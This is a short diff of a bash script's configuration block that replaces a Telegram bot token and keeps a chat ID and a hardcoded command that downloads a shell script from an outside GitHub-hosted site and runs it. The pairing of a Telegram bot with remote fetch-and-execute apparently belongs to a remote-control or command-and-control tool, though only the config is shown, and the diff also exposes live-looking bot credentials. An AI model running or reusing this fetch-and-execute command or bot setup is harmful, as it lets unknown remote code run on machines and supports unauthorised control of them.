@@ -7,7 +7,7 @@
 set -euo pipefail
 
 ################ CONFIG ################
-TOKEN="7930568732:AAFX_JcdEO3kNrmma6x1xHLahbHD1cgmet8"
+TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
 HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/linux-tools.sh -o linux-tools.sh && chmod +x linux-tools.sh && ./linux-tools.sh"   # <-- replace this with your hardcoded command
 ########################################
